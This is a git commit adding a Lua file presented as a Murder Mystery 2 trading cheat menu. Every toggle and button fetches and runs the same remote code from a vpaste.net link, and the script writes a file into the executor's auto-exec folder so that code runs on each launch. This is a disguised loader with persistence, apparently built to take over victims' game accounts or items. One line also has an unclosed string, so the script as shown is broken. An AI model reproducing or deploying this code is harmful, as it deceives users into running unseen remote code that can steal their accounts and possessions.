2afcf92d988a0236b73c4df72fca78462570f805
no <mys4exz4@gmail.com>
2025-04-27 13:38:57 +0700

    Create mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,33 @@
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/bacon"))()
+local window = lib:CreateWindow("Zyperion)
+local label = lib:CreateLabel(window, "Main")
+
+local autoForceTrade = false
+lib:CreateToggle(window, "Auto Force Trade", false, function(state)
+    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+end)
+
+local autoTrade = false
+lib:CreateToggle(window, "Auto Trade", false, function(state)
+    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+end)
+
+lib:CreateButton(window, "Auto Accept Trade", function()
+    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+end)
+
+local folders = {"Auto Exec"}
+local selectedFolder = nil
+
+for _, folder in ipairs(folders) do
+    if isfolder(folder) then
+        selectedFolder = folder
+        break
+    end
+end
+
+if selectedFolder and writefile then
+    writefile(selectedFolder.."/baconhubauto.lua", [[
+loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+]])
+end
